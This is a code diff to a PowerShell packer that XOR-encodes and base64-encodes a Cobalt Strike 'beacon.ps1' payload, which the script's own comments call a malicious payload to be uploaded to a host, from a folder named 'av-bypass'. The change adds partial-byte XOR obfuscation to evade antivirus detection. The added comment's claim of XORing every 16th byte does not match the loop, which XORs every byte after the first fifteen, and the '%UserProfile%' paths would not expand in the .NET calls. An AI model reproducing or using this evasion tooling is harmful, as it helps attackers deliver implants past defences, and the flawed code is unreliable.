@@ -2,11 +2,17 @@
 
 #####Part 1
 #Loads file from path
-$BinaryPath = "C:\Users\huifeng1\Desktop\cobalt\av-bypass\beacon.ps1"
+$BinaryPath = "%UserProfile%\Desktop\beacon.ps1" # Edit by hamilton-bonds
 $file = [IO.File]::ReadAllBytes($BinaryPath)
-#Xor this file with 82 (pick a random number here)
-$encodedFile = $file | ForEach-Object { return $_ -bxor 82}
+
+# Code added by hamilton-bonds
+# XOR every $N+1th byte with $xVar
+$ctr = 0
+$N = 15
+$xVar = 82
+$encodedFile = $file | ForEach-Object { if ($ctr -eq $N) {return $_ -bxor $xVar} else {$ctr = $ctr + 1; return $_} }
+
 #This is the packed malicious payload in string form
 $base64Code = [Convert]::ToBase64String($encodedFile)
 #Write it out to a file to be uploaded to the host
-[IO.File]::WriteAllText("C:\Users\huifeng1\Desktop\cobalt\av-bypass\encode.txt", $base64Code)
+[IO.File]::WriteAllText("%UserProfile%\Desktop\encode.txt", $base64Code) # Edit by hamilton-bonds
